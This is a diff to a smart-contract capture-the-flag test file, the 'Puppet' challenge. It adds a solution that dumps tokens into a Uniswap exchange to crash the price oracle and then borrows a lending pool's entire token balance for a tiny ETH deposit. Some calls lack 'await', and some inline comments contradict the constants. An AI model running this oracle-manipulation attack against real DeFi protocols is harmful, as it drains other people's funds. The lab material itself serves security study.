@@ -11,6 +11,21 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
     )
 }
 
+async function printAccountsStatus(token, attacker, lendingPool, uniswapExchange, POOL_INITIAL_TOKEN_BALANCE) {
+    let tokenBalance = ethers.utils.formatEther(await token.balanceOf(attacker.address));
+    let ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
+    let tokenBalanceLendingPool = ethers.utils.formatEther(await token.balanceOf(lendingPool.address));
+    let depositRequired = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+    let depositRequiredFormatted = ethers.utils.formatEther(depositRequired);
+
+    console.log("\nLending Pool Balance: ", tokenBalanceLendingPool);
+    console.log("Deposit required for 100k: ", depositRequiredFormatted,
+        "\nAttacker Balance in Token: ", tokenBalance,
+        "\nAttacker balance in ETH: ", ethBalance,
+        "\nUniswap exchange balance: ", ethers.utils.formatEther(await this.token.balanceOf(uniswapExchange.address))
+    );
+}
+
 describe('[Challenge] Puppet', function () {
     let deployer, attacker;
 
@@ -23,7 +38,7 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
@@ -60,7 +75,7 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -72,7 +87,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
@@ -86,10 +101,10 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
-        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
+        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);//1000
+        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);//10
 
         // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
         expect(
@@ -102,7 +117,62 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        let tokenBalance = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
+        let ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
+        let tokenBalanceLendingPool = ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address));
+        let depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        //Just printing some info to plan the attack
+        console.log("###\tInfo at the beggining\t###");
+        console.log("\nLending Pool Balance: ", tokenBalanceLendingPool);
+        console.log("Deposit required for 100k: ", ethers.utils.formatEther(depositRequired),
+            "\nAttacker Balance in Token: ", tokenBalance,
+            "\nAttacker balance in ETH: ", ethBalance,
+            "\nUniswap exchange balance in token: ", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)),
+            "\nUniswap exchange balance in ETH: ", ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))
+        );
+
+        //I'm going to swap all my token to eth, thus, the price falls and I also have enough eth to spend
+        //First I need to approve uniswapExchange to spend
+        this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        //Then I swap token to eth using
+        //'tokenToEthSwapInput(uint256,uint256,uint256)'
+        this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ethers.utils.parseEther('999'),
+            ethers.utils.parseEther('9'),
+            (await ethers.provider.getBlock('latest')).timestamp * 2);
+
+        tokenBalance = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
+        ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
+
+        console.log("\n###\tAfter Swap token->ETH\t###");
+        console.log("\nAttacker Balance in Token: ", tokenBalance,
+            "\nAttacker balance in ETH: ", ethBalance,
+            "\nUniswap exchange balance: ", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)),
+            "\nUniswap balance in ETH: ", ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))
+        );
+
+        depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("\n###\tNow, lets check the swap impact\t### ");
+        console.log(
+            "Deposit Required: ", ethers.utils.formatEther(depositRequired),
+
+        );
+
+        this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositRequired });
+
+        tokenBalance = ethers.utils.formatEther(await this.token.balanceOf(attacker.address));
+        ethBalance = ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address));
+        tokenBalanceLendingPool = ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address));
+        console.log("\n#####\tAFTER run borrow function\t#####");
+        console.log(
+            "\nAttacker Balance in Token: ", tokenBalance,
+            "\nAttacker balance in ETH: ", ethBalance,
+            "\nLending Pool balance: ", tokenBalanceLendingPool
+        );
+
     });
 
     after(async function () {
